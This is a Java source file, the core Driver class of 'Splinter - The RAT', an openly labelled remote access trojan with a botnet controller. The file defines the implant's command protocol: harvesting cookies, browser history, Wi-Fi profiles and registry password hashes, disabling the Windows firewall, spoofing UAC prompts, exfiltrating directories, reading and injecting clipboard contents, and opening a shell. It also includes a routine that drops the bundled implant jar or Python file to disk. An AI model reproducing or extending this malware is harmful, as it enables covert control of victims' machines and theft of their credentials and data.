/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant;

import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.GUI.JPanel_TextDisplayPane;
import Controller.GUI.Splinter_GUI;
import Controller.Thread.Thread_Terminal;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.Payloads.MapSystemProperties;
import RelayBot.RelayBot_ServerSocket;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.URL;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileFilter;

public class Driver
{
  public static final String TITLE = "Splinter - RAT vrs 1.41 - BETA";
  public static String strMyClassName = "Driver";
  public static final double VERSION = 1.41D;
  public static boolean instance_loaded_CONTROLLER = false;

  public static boolean acquireAgentOverheadData = true;
  public static final int IMPLANT_ID_UNKNOWN = 0;
  public static final int IMPLANT_ID_NETCAT = 1;
  public static final int IMPLANT_ID_SPLINTER_IMPLANT = 2;
  public static final int IMPLANT_ID_SPLINTER_CONTROLLER = 3;
  public static final int IMPLANT_ID_RELAY_BRIDGE = 4;
  public static final int IMPLANT_ID_RELAY_PROXY = 5;
  public static final int IMPLANT_ID_BEACON = 6;
  public static final int IMPLANT_ID_LOGGIE = 7;
  public static final String[] ARR_IMPLANT_NAME = { "UNKNOWN", "NETCAT", "SPLINTER - IMPLANT", "SPLINTER - CONTROLER", "SPLINTER - RELAY BRIDGE", "SPLINTER - RELAY PROXY", "SPLINTER - BEACON IMPLANT", "SPLINTER - LOGGIE" };
  public static final String controller_type = "SPLINTER - CONTROLLER";
  public static final String relay_bridge_type = "SPLINTER - RELAY BRIDGE";
  public static final String relay_proxy_type = "SPLINTER - RELAY PROXY";
  public static boolean controller_is_running = false;
  public static final String delimeter_1 = "%%%%%";
  public static final String delimeter_2 = "#####";
  public static final String delimeter_3_logging = "@@@@@";
  public static final int IMPLANT_TYPE_UNKNOWN = 0;
  public static final int IMPLANT_TYPE_SPLINTER_JAVA = 1;
  public static final int IMPLANT_TYPE_SPLINTER_PYTHON = 2;
  public static final int IMPLANT_TYPE_NETCAT = 3;
  public static final String SPLINTER_BEACON_INITIAL_REGISTRATION = "[SPLINTER_BEACON]";
  public static final String HANDSHAKE = "[[[HANDSHAKE]]]";
  public static final String SPLINTER_BEACON_RESPONSE_HEADER = "[SPLINTER_BEACON_RESPONSE_HEADER]";
  public static final String SPLINTER_BEACON_END_DATA_TRANSFER = "[SPLINTER_BEACON_RESPONSE_ALL_DATA_HAS_BEEN_SENT]";
  public static final String CONTROLLER_INITIAL_REGISTRATION = "[SPLINTER_CONTROLLER]";
  public static final String RELAY_INITIAL_REGISTRATION_BRIDGE = "[SPLINTER_RELAY_BRIDGE]";
  public static final String RELAY_INITIAL_REGISTRATION_PROXY = "[SPLINTER_RELAY_PROXY]";
  public static final String RELAYED_AGENT_INITIAL_REGISTRATION = "[SPLINTER_RELAYED_AGENT_INFO]";
  public static final String LOGGIE_AGENT_REGISTRATION = "[SPLINTER_LOGGIE_AGENT]";
  public static final String RELAY_ECHO = "[RELAY_ECHO]";
  public static final String RELAY_DOWN_MESSAGE = "RELAY_IS_DOWN";
  public static final String SEND_FILE_TO_CONTROLLER = "SEND_FILE";
  public static final String CAPTURE_SCREEN = "CAPTURE_SCREEN";
  public static final String RUNNING_PROCESS_LIST = "RUNNING_PS";
  public static final String DISPLAY_DNS = "DISPLAY_DNS";
  public static final String DISABLE_WINDOWS_FIREWALL = "DISABLE_WINDOWS_FIREWALL";
  public static final String ENABLE_WINDOWS_FIREWALL = "ENABLE_WINDOWS_FIREWALL";
  public static final String DISPLAY_WINDOWS_FIREWALL = "DISPLAY_WINDOWS_FIREWALL";
  public static final String ENABLE_CLIPBOARD_EXTRACTOR = "ENABLE CLIPBOARD EXTRACTOR";
  public static final String ENABLE_CLIPBOARD_INJECTOR = "ENABLE CLIPBOARD INJECTOR";
  public static final String DISABLE_CLIPBOARD_EXTRACTOR = "DISABLE CLIPBOARD EXTRACTOR";
  public static final String DISABLE_CLIPBOARD_INJECTOR = "DISABLE CLIPBOARD INJECTOR";
  public static final String REQUEST_IMPLANT_REGISTRATION = "REQUEST IMPLANT REGISTRATION";
  public static final String SET_IMPLANT_REGISTRATION = "SET IMPLANT REGISTRATION";
  public static final String REQUEST_BEACON_COMMAND_LIST = "REQUEST BEACON COMMAND LIST";
  public static final String BEACON_SHORTCUT_ESTABLISH_SHELL = "ESTABLISH SHELL";
  public static final String BEACON_EXECUTE_COMMAND = "BEACON COMMAND";
  public static final String BEACON_END_COMMAND_UPDATE = "[END BEACON COMMAND UPDATES]";
  public static final String SCRAPE_SCREEN = "SCRAPE SCREEN";
  public static final String DISABLE_RECORD_SCREEN = "DISABLE RECORD SCREEN";
  public static String CHAT_MESSAGE_BROADCAST = "CHAT_MESSAGE";
  public static String FLAG_BROADCAST = "BROADCAST";
  public static String FLAG_PRIVATE = "PRIVATE";
  public static final int THREAD_READLINE_INTERRUPT_INTERVAL_MILLIS = 10;
  public static final int THREAD_RUNNING_PROCESS_LIST_INTERVAL_MILLIS = 2000;
  public static final int THREAD_REFRESH_JTABLE_RUNNING_PROCESS_LIST_INTERVAL_MILLIS = 100;
  public static final int THREAD_REFRESH_FILE_BROWSWER_INTERVAL_MILLIS = 100;
  public static final String BEGIN_RUNNING_PROCESS_LIST = "BEGIN_RUNNING_PS";
  public static final String DATA_RUNNING_PROCESS_LIST = "DATA_RUNNING_PS";
  public static final String END_RUNNING_PROCESS_LIST = "END_RUNNING_PS";
  public static final String STOP_RUNNING_PROCESS_LIST = "STOP_RUNNING_PS";
  public static final String ENUMERATE_SYSTEM = "ENUMERATE";
  public static final String HARVEST_WIRELESS_PROFILE = "HARVEST_WIRELESS_PROFILE";
  public static final String HARVEST_COOKIES = "HARVEST_COOKIES";
  public static final String HARVEST_BROWSER_HISTORY = "HARVEST_BROWSER_HISTORY";
  public static final String HARVEST_REGISTRY_HASHES = "HARVEST_REGISTRY_HASHES";
  public static final String SPOOF_UAC = "SPOOF_UAC";
  public static final String SET_WALLPAPER = "SET_WALL_PAPER";
  public static final String FILE_BROWSER_HEADER = "FILE_BROWSER_HEADER";
  public static final String FILE_BROWSER_INITIATE = "INITIATE_FILE_BROWSER";
  public static final String FILE_BROWSER_MESSAGE = "FILE_BROWSER_MESSAGE";
  public static final String BEGIN_FILE_BROWSER_FILE_ROOTS = "BEGIN_FILE_ROOTS";
  public static final String FILE_BROWSER_FILE_ROOTS = "FILE_ROOTS";
  public static final String END_FILE_BROWSER_FILE_ROOTS = "END_FILE_ROOTS";
  public static final String FILE_BROWSER_CURRENT_PATH = "CURRENT_PATH";
  public static final String FILE_BROWSER_MAP_DIRECTORY = "FILE_BROWSER_MAP_DIRECTORY";
  public static final String FILE_BROWSER_CREATE_DIRECTORY = "FILE_BROWSER_CREATE_DIRECTORY";
  public static final String FILE_BROWSER_DELETE_DIRECTORY = "FILE_BROWSER_DELETE_DIRECTORY";
  public static final String FILE_BROWSER_EMPTY_DIRECTORY = "EMPTY_DIRECTORY";
  public static final String FILE_BROWSER_CAT_FILE = "CAT_FILE";
  public static final String BEGIN_FILE_BROWSER_FILE_LIST = "BEGIN_FILE_LIST";
  public static final String FILE_BROWSER_FILE_LIST = "FILE_LIST";
  public static final String END_FILE_BROWSER_FILE_LIST = "END_FILE_LIST";
  public static final String EMPTY_DIRECTORY_MESSAGE = "** NOTE -> No [Files] populated under specified directory: ";
  public static final String STOP_PROCESS = "STOP_PROCESS";
  public static final String ORBIT_DIRECTORY = "ORBIT_DIRECTORY";
  public static final int ORBIT_DIRECTORY_DELAY_MILLIS = 1000;
  public static final String STOP_ORBIT_DIRECTORY = "STOP_ORBIT_DIRECTORY";
  public static final String EXFIL_DIRECTORY = "EXFIL_DIRECTORY";
  public static final String EXTRACT_CLIPBOARD = "EXTRACT_CLIPBOARD";
  public static final String INJECT_CLIPBOARD = "INJECT_CLIPBOARD";
  public static final String RESPONSE_CLIPBOARD = "RESPONSE_CLIPBOARD";
  public static final String NO_TEXT_RESPONSE_CLIPBOARD = " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *";
  public static final String NO_TEXT_RESPONSE_CLIPBOARD_ERROR = " *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***";
  public static final String DATA_EXFIL_EXTRACTOR_PAYLOAD = "EXTRACTOR_PAYLOAD";
  public static final String DATA_EXFIL_SELECTOR_PAYLOAD = "SELECTOR_PAYLOAD";
  public static final String DATA_EXFIL_INSPECTOR_PAYLOAD = "INSPECTOR_PAYLOAD";
  public static final String DATA_EXFIL_INJECTOR_PAYLOAD = "INJECTOR_PAYLOAD";
  public static final String DATA_EXFIL_ALERTER_PAYLOAD = "ALERTER_PAYLOAD";
  public static final String UPLOAD_FILE_TO_CONTROLLER = "UPLOAD_FILE";
  public static final String DOWNLOAD_FILE_FROM_CONTROLLER = "DOWNLOAD_FILE";
  public static final String SHARE_DIRECTORY = "SHARE_DIRECTORY";
  public static final String TIME_STOMP = "UPLOAD_FILE";
  public static final String MOVE_FILE = "MOVE_FILE";
  public static final String SET_PERMISSIONS = "SET_PERMISSIONS";
  public static final String CAT_FILE = "CAT_FILE";
  public static final String DELETE_FILE = "DELETE_FILE";
  public static final int RELAY_BEACON_INTERVAL_MILLIS = 1000;
  public static final String RELAY_DELIMETER_INITIAL_REGISTRATION = "[RELAY_INITIAL_RGISTRATION]";
  public static final String RELAY_CLEAR_RELAY_SOCKETS = "[RELAY_CLEAR_MY_REPORTED_SOCKETS]";
  public static final String RELAY_NEW_SOCKET = "[RELAY_NEW_CONNECTED_IMPLANT]";
  public static final String RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY = "[RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY]";
  public static final String RELAY_FORWARD_DELIMETER = "[RELAY_MESSAGE_TO_FORWARD_CONTROLLER]";
  public static final String SCREEN_CAPTURE_DIRECTORY_NAME = "SCREEN CAPTURE";
  public static final String CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT = "png";
  public static FTP_ServerSocket FTP_ServerSocket = null;

  public static String myHandShake = "";
  public static final String FILTER_DELIMITER = ",";
  public static int myImplant_Type = 1;

  public static final String fileSeperator = System.getProperty("file.separator");
  public static final String jar_dropper_name = "Splinter.jar";
  public static final String python_dropper_name = "Splinter.py";
  public static final String dropper_JavaImplantPath = "/Implant/Binaries/Implants/Java/Splinter.jar";
  public static final String dropper_PythonImplantPath = "/Implant/Binaries/Implants/Python/Splinter.py";
  public static volatile boolean outputEnabled = true;
  public static final String extension = "png";
  public static boolean enableGPS_Resolution = true;

  public static JPanel_TextDisplayPane jtxtpne_CnslOut = null;

  public static JPanel_TextDisplayPane txtpne_broadcastMessages = null;

  public static volatile ArrayList<Long> alRandomUniqueImplantIDs = null;
  public static final String DISCONNECT_TOKEN = "disconnectImplant";
  public static final String DISCONNECT_RELAY = "disconnectRelay";
  public static final String DISCONNECT_LOGGER = "disconnectLogger";
  public static final String SHUTDOWN_RELAY = "shutdownRelay";
  public static final String SPLINTER_DELIMETER_INITIAL_REGISTRATION = "[SPLINTER_IMPLANT]";
  public static final String SPLINTER_DELIMETER_OPEN = "[SPLINTER_IMPLANT@";
  public static final String INTERNAL_DELIMETER = "/";
  public static final String SHORTCUT_KEY_HEADER = "<@SHORTCUT>/";
  public static final String SHORT_KEY_DEFAULT_IMPLANT_NAME = "Splinter_RAT.jar";
  public static final int SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER = 3;
  public static final int SHORTCUT_BROWSE_REMOTE_FILE_SYSTEM = 4;
  public static volatile long numConnectedImplants = 0L;

  public static volatile File fleCurrentWorkingDirectory = null;

  public static ArrayList<Splinter_IMPLANT> alImplant = null;
  public static ArrayList<Thread_Terminal> alBeaconTerminals = new ArrayList();
  public static volatile ArrayList<FTP_Thread_Receiver> alConnectedFTPClients;
  public static File fleFTP_DropBoxDirectory = null;
  public static volatile boolean autoAcceptFTP_Files = false;

  public static ArrayList<Thread_Terminal> alRelayTerminals = new ArrayList();
  public static ArrayList<Thread_Terminal> alLoggingAgents = new ArrayList();

  static Thread_Terminal terminal_log = null;

  public static String CURRENT_WORKING_DIRECTORY = "";

  public static MapSystemProperties systemMap = new MapSystemProperties(false);

  public static boolean isLoggingEnabled = true;
  public static final int CLIPBOARD_INTERRUPT_INTERVAL_MILLIS = 200;
  public static final int RECORD_SCREEN_INTERRUPT_INTERVAL_MILLIS = 1000;
  public static String[] arrShortCuts = { 
    JPanel_MainControllerWindow.strShortcut_Title, 
    "ESTABLISH SHELL" };

  public static boolean logReceivedLine(boolean directionIN, long threadID, String agentRegistrationID, String sender, String recipient, String senderIP, String recipientIP, String line)
  {
    try
    {
      if (!isLoggingEnabled)
      {
        return false;
      }

      if (alLoggingAgents == null)
      {
        alLoggingAgents = new ArrayList();
        return false;
      }

      if (alLoggingAgents.size() < 1)
      {
        return false;
      }

      if ((line == null) || (line.trim().equals("")))
      {
        return false;
      }

      for (int i = 0; i < alLoggingAgents.size(); i++)
      {
        terminal_log = (Thread_Terminal)alLoggingAgents.get(i);
        try
        {
          terminal_log.pwOut.println(directionIN + "@@@@@" + threadID + "@@@@@" + agentRegistrationID + "@@@@@" + sender + "@@@@@" + recipient + "@@@@@" + senderIP + "@@@@@" + recipientIP + "@@@@@" + line);
          terminal_log.pwOut.flush();
        }
        catch (Exception localException1)
        {
        }

      }

      return true;
    }
    catch (Exception e)
    {
      eop("logReceivedLine", strMyClassName, e, "", false);
    }

    return false;
  }

  public static void sop(String line)
  {
    if (outputEnabled)
      System.out.println(line);
    try
    {
      if (jtxtpne_CnslOut != null) jtxtpne_CnslOut.appendString(false, line, Drivers.clrForeground, Drivers.clrBackground); 
    }
    catch (Exception localException) {
    }
  }

  public static void sp(String line) { if (outputEnabled)
      System.out.print(line);
    try
    {
      if (jtxtpne_CnslOut != null) jtxtpne_CnslOut.appendString(false, line, Drivers.clrForeground, Drivers.clrBackground);
    }
    catch (Exception localException)
    {
    }
  }

  public static long getUniqueRandomNumber()
  {
    try
    {
    	long rand = (long) (Math.random() * Drivers.MAX_THREAD_COUNT);

      if (alRandomUniqueImplantIDs.contains(Long.valueOf(rand)))
      {
        Drivers.sop("In getUniqueRandomNumber mtd in Drivers.  Rand number: " + rand + " already exists. Generating a new one");
        return getUniqueRandomNumber();
      }

      alRandomUniqueImplantIDs.add(Long.valueOf(rand));

      return rand;
    }
    catch (Exception e)
    {
      Drivers.eop("getUniqueRandomNumber", "Driver", e, e.getLocalizedMessage(), false);
    }

    return 0L;
  }

  public static void eop(String mtdName, String strMyClassName, Exception e, String errorMessage, boolean printStackTrace)
  {
    if ((errorMessage == null) || (errorMessage.trim().equals(""))) {
      sop("\nException caught in " + mtdName + " mtd in " + strMyClassName);
    }
    else {
      sop("\nException caught in " + mtdName + " mtd in " + strMyClassName + " Error Message: " + errorMessage);
    }
    if (printStackTrace)
      e.printStackTrace(System.out);
  }

  public static boolean dropImplantFile(String pathInJAR_To_Extract, String implantName_And_Extension)
	{
		
		java.net.URL url_Dropper = Splinter_GUI.class.getResource(pathInJAR_To_Extract);
		
		
		
		try
		{			
			
			if(url_Dropper == null || url_Dropper.toString().trim().equals(""))
			{
				String errorMsg = "* * * ERROR --> " + pathInJAR_To_Extract + " does not exist within this image file!!!!!  I am Unable to process drop request";
				Driver.sop(errorMsg);
				
				return false;
			}
			
			File dropDirectory = Driver.querySelectFile(false, "Please Select the Directory to drop the implant", JFileChooser.DIRECTORIES_ONLY, false, false);

			if(dropDirectory != null && dropDirectory.isDirectory() && dropDirectory.exists())
			{
				File implantOutFile = null;
				
				if(dropDirectory.getCanonicalPath().trim().endsWith(Driver.fileSeperator))
				{
					implantOutFile = new File(dropDirectory.getCanonicalFile() + implantName_And_Extension);
				}
				else//else, add the seperator between directory and implant file name
				{
					implantOutFile = new File(dropDirectory.getCanonicalFile() + Driver.fileSeperator + implantName_And_Extension);
				}
				
				InputStream isIn = (Driver.class.getResourceAsStream(pathInJAR_To_Extract));
				FileOutputStream osOut = new FileOutputStream(implantOutFile);
				
				int bufferSize = 4096;
				int totalBytesWritten = 0;
				byte[] buffer = new byte[bufferSize];
				int bytesReadFromBuffer;
				while ((bytesReadFromBuffer = isIn.read(buffer, 0, bufferSize)) > 0) 
				{
					osOut.write(buffer, 0, bytesReadFromBuffer);
					totalBytesWritten += bytesReadFromBuffer;
				}
				
				isIn.close();
				osOut.close();
				
				Driver.sop("Implant Extraction successful!!! " + " total bytes written: " + Driver.getFormattedFileSize_String(totalBytesWritten) + "  --> Saved at " + implantOutFile.getCanonicalPath() );
				
			}
			else
			{
				Driver.sop("No directory selected to drop implant file.");
				return false;
			}
			
			
			
			
			return true;
		}
		
		catch(FileNotFoundException fnfe)
		{
			try
			{
				Driver.sop(" ERROR!!! --> Unable to save to location: " + new File(url_Dropper.toURI()).getCanonicalPath() + " <-- Perhaps this location is restricted, or Access is Denied!  Please try a different location");
			}
			catch(Exception ee)
			{
				Driver.sop("NOPE!!! --> Unable to save to location.  Perhaps this location is restricted, or Access is Denied!  Please try a different location");
				
			}
		}
		
		catch(Exception e)
		{
			Driver.eop("dropFile", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

  public static String getFormattedFileSize_String(String fileSize_bytes)
  {
    try
    {
      return getFormattedFileSize_String(Long.parseLong(fileSize_bytes));
    }
    catch (Exception localException)
    {
    }

    return fileSize_bytes;
  }

  public static String getFormattedFileSize_String(long fileSize_bytes)
  {
    try
    {
      double fileSize = fileSize_bytes;

      DecimalFormat formatter = new DecimalFormat("##0.00");

      if (fileSize_bytes < 1000L)
      {
        return formatter.format(fileSize) + " B";
      }

      if ((fileSize_bytes > 1L) && (fileSize_bytes < 99000.0D))
      {
        return formatter.format(fileSize_bytes / 1000.0D) + " KB";
      }

      if ((fileSize_bytes > 1000.0D) && (fileSize_bytes < 99000000.0D))
      {
        return formatter.format(fileSize_bytes / 1000000.0D) + " MB";
      }

      if ((fileSize_bytes > 1000000.0D) && (fileSize_bytes < 99000000000.0D))
      {
        return formatter.format(fileSize_bytes / 1000000000.0D) + " GB";
      }

      if ((fileSize_bytes > 1000000000.0D) && (fileSize_bytes < 99000000000000.0D))
      {
        return formatter.format(fileSize_bytes / 1000000000000.0D) + " TB";
      }
      if ((fileSize_bytes > 1000000000000.0D) && (fileSize_bytes < 99000000000000000.0D))
      {
        return formatter.format(fileSize_bytes / 1000000000000000.0D) + " PB";
      }

      return formatter.format(fileSize_bytes) + " B";
    }
    catch (Exception e)
    {
      Drivers.eop("getFormattedFileSize_String", "Driver", e, e.getMessage(), true);

      Drivers.sop("Unable to determine File Size");
    }
    return ""+fileSize_bytes;
  }

  public static ArrayList getFilesUnderSelectedDirectory(File fleDirectoryPath, boolean limitFilesTo_ONLY_AcceptableFileExtensions)
  {
    ArrayList alToReturn = new ArrayList();
    try
    {
      if (fleDirectoryPath == null) {
        throw new Exception("Null value passed in");
      }
      if (fleDirectoryPath.isFile()) {
        throw new Exception("Directory path was specified; instead, received path to a file");
      }

      File[] fleFilePaths = fleDirectoryPath.listFiles();

      String strFleExtension = "";

      for (int i = 0; i < fleFilePaths.length; i++)
      {
        if (fleFilePaths[i].isFile())
        {
          if (limitFilesTo_ONLY_AcceptableFileExtensions)
          {
            strFleExtension = getFileExtension(fleFilePaths[i], false).replace(".", "");
          }
          else
          {
            alToReturn.add(fleFilePaths[i]);
          }

        }

      }

      return alToReturn;
    }
    catch (Exception e)
    {
      Drivers.eop("getFilesUnderSelectedDirectory", "Driver", e, e.getMessage(), true);
    }

    return null;
  }

  public static ArrayList<File> getFilesUnderSelectedDirectory(File fleDirectoryPath, String[] acceptableExtensions)
  {
    ArrayList alToReturn = new ArrayList();

    List lstAcceptableFileExtensions = null;

    if (acceptableExtensions != null) {
      lstAcceptableFileExtensions = Arrays.asList(acceptableExtensions);
    }

    try
    {
      if (fleDirectoryPath == null) {
        throw new Exception("Null value passed in");
      }
      if (fleDirectoryPath.isFile()) {
        throw new Exception("Directory path was specified; instead, received path to a file");
      }

      File[] fleFilePaths = fleDirectoryPath.listFiles();

      String strFleExtension = "";

      for (int i = 0; i < fleFilePaths.length; i++)
      {
        if (fleFilePaths[i].isFile())
        {
          if (lstAcceptableFileExtensions != null)
          {
            strFleExtension = getFileExtension(fleFilePaths[i], false).replace(".", "");
            if ((lstAcceptableFileExtensions.contains(strFleExtension.toLowerCase())) || (lstAcceptableFileExtensions.contains(strFleExtension.toUpperCase())))
              alToReturn.add(fleFilePaths[i]);
          }
          else
          {
            alToReturn.add(fleFilePaths[i]);
          }
        }
      }

      return alToReturn;
    }
    catch (Exception e)
    {
      Drivers.eop("getFilesUnderSelectedDirectory with acceptableExtensions array", "Driver", e, e.getMessage(), true);
    }

    return null;
  }

  public static File querySelectFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
  {
    try
    {
      JFileChooser jfc = new JFileChooser(new File("."));
      jfc.setFileSelectionMode(fileChooserSelectionMode);
      jfc.setDialogTitle(dialogueTitle);

      if (thisLoadsCSV)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            if (fle.isDirectory()) {
              return true;
            }
            String strFleName = fle.getName().toLowerCase();

            return strFleName.endsWith(".csv");
          }

          public String getDescription()
          {
            return "Comma Separated Values";
          }

        });
      }
      else if (useFileFilter)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            String extension = "";

            if (fle.isDirectory()) {
              return true;
            }
            if (fle == null) {
              return false;
            }
            if ((fle != null) && (fle.exists()) && (Driver.getFileExtension(fle, false) != null)) {
              extension = Driver.getFileExtension(fle, false).replace(".", "");
            }

            return false;
          }

          public String getDescription()
          {
            return "Specific Formats";
          }

        });
      }

      try
      {
        jfc.setCurrentDirectory(new File(".\\"));
      } catch (Exception localException1) {
      }
      int selection = 0;

      if (openDialog)
      {
        selection = jfc.showOpenDialog(null);
      }
      else
      {
        selection = jfc.showSaveDialog(null);
      }

      if (selection == 0)
      {
        if ((openDialog) || ((!openDialog) && (!thisLoadsCSV))) {
          return jfc.getSelectedFile();
        }

        return new File(jfc.getSelectedFile().getAbsolutePath() + ".csv");
      }

    }
    catch (Exception e)
    {
      Drivers.eop("querySelectFile", "Driver", e, e.getMessage(), false);
    }

    return null;
  }

  public static Thread_Terminal getBeaconThread(String confirmationID)
  {
    try
    {
      if ((confirmationID == null) || (confirmationID.trim().equals("")))
      {
        return null;
      }

      Thread_Terminal beacon = null;

      for (int i = 0; i < alBeaconTerminals.size(); i++)
      {
        beacon = (Thread_Terminal)alBeaconTerminals.get(i);

        if (confirmationID.trim().equalsIgnoreCase(beacon.myReceivedConfirmationID_From_Implant))
        {
          return beacon;
        }

      }

    }
    catch (Exception e)
    {
      eop("getBeaconThread", strMyClassName, e, "", false);
    }

    return null;
  }

  public static String getFileExtension(File fle, boolean removeDot_Preceeding_Extension)
  {
    try
    {
      if (fle != null)
      {
        if (removeDot_Preceeding_Extension) {
          return fle.toString().substring(fle.toString().lastIndexOf(".") + 1);
        }

        if ((!fle.toString().contains(".")) || (fle.toString().lastIndexOf(".") < 0))
        {
          try
          {
            return fle.toString().substring(fle.toString().lastIndexOf(System.getProperty("file.separator")));
          }
          catch (Exception e)
          {
            return " ";
          }
        }

        return fle.toString().substring(fle.toString().lastIndexOf("."));
      }

    }
    catch (NullPointerException npe)
    {
      Drivers.sop("NullPointerException caught in getFileExtension_ByteArray mtd in Drivers.  This seems to be a sporadic error, called when user first attempts to view the files in a directory. This does not affect funtionality of program.  Dismissing error...");
    }
    catch (Exception e)
    {
      Drivers.eop("getFileExtension", "Driver", e, "Possibly null file passed in", true);
    }

    return null;
  }

  public static File[] querySelectMultipleFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
  {
    try
    {
      JFileChooser jfc = new JFileChooser(new File("."));
      jfc.setFileSelectionMode(fileChooserSelectionMode);
      jfc.setDialogTitle(dialogueTitle);
      jfc.setMultiSelectionEnabled(true);

      if (thisLoadsCSV)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            if (fle.isDirectory()) {
              return true;
            }
            String strFleName = fle.getName().toLowerCase();

            return strFleName.endsWith(".csv");
          }

          public String getDescription()
          {
            return "Comma Separated Values";
          }

        });
      }
      else if (useFileFilter)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            String extension = "";

            if (fle.isDirectory()) {
              return true;
            }
            if (fle == null) {
              return false;
            }
            if ((fle != null) && (fle.exists()) && (Driver.getFileExtension(fle, false) != null)) {
              extension = Driver.getFileExtension(fle, false).replace(".", "");
            }

            return false;
          }

          public String getDescription()
          {
            return "Multiple Formats";
          }

        });
      }

      try
      {
        jfc.setCurrentDirectory(new File(".\\"));
      } catch (Exception localException1) {
      }
      int selection = 0;

      if (openDialog)
      {
        selection = jfc.showOpenDialog(null);
      }
      else
      {
        selection = jfc.showSaveDialog(null);
      }

      if (selection == 0)
      {
        if ((openDialog) || ((!openDialog) && (!thisLoadsCSV))) {
          return jfc.getSelectedFiles();
        }

      }

    }
    catch (Exception e)
    {
      Drivers.eop("querySelectFile", "Driver", e, e.getMessage(), true);
    }

    return null;
  }

  private File[] returnSelectedFiles(JFileChooser jfcToReturn)
  {
    try
    {
      return jfcToReturn.getSelectedFiles();
    }
    catch (Exception e)
    {
      Drivers.eop("returnSelectedFiles", strMyClassName, e, e.getLocalizedMessage(), true);
    }

    return null;
  }

  public static String getTimeStamp_Without_Date()
  {
    String timeToSplit = "";
    String dateTime_To_Display = "";

    String strHourMin = "";

    Date dateTime = new Date();
    try
    {
      timeToSplit = dateTime.toString();

      String[] arrSplitTime = timeToSplit.split(" ");

      if (arrSplitTime.length != 6) {
        throw new Exception();
      }
      String[] arrSplitHour = arrSplitTime[3].split(":");

      if (arrSplitHour.length != 3) {
        throw new Exception();
      }
      return strHourMin = arrSplitHour[0] + ":" + arrSplitHour[1] + " \"" + arrSplitHour[2];
    }
    catch (Exception e)
    {
      dateTime_To_Display = "Time: " + dateTime.toString();
    }

    return dateTime_To_Display;
  }

  public static boolean removeThread(Splinter_IMPLANT threadToRemove, long threadID_ToRemove)
  {
    try
    {
      if ((alImplant == null) || (alImplant.size() < 1))
      {
        sop("ArrayList is empty. No clients further to remove");
        numConnectedImplants = 0L;
        return false;
      }

      if (alImplant.contains(threadToRemove))
      {
        alImplant.remove(threadToRemove);
        numConnectedImplants = alImplant.size();
      }

      sop("Thread ID: [" + threadID_ToRemove + "] has been removed." + "# Threads remaining: " + alImplant.size());

      return true;
    }
    catch (Exception e)
    {
      sop("Exception handled when removing thread id: " + threadID_ToRemove);
    }

    return false;
  }
  public static long getTime_Current_Millis() {
    try { return System.currentTimeMillis(); } catch (Exception localException) {  } return 1L;
  }

  public static String getTimeStamp_Updated()
  {
    String timeToSplit = "";

    SimpleDateFormat dateFormat = new SimpleDateFormat("EE - dd MMM yyyy - HH:mm \"ss - zzzz");

    String dateTime_To_Display = "";

    Date dateTime = new Date();
    try
    {
      timeToSplit = dateFormat.format(dateTime);

      String[] arrSplitTime = timeToSplit.split("-");

      String[] arrSplitTimeZone = arrSplitTime[3].split(" ");

      return arrSplitTime[0] + " - " + arrSplitTime[1] + " - " + arrSplitTime[2] + "- " + arrSplitTimeZone[1] + "         ";
    }
    catch (Exception e)
    {
      try
      {
        return getTimeStamp_Without_Date();
      }
      catch (Exception ee) {
      }
    }
    return dateTime_To_Display = "Time: " + dateTime.toString();
  }

  public static String getTime_Specified_Hyphenated(long time_millis)
  {
    try
    {
      DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HHmm");
      dateFormat.setLenient(false);

      Date dateTime = new Date(time_millis);

      return dateFormat.format(dateTime);
    }
    catch (Exception e)
    {
      Drivers.sop("Invalid date specified - - it does not a proper date was selected");
    }

    return "";
  }

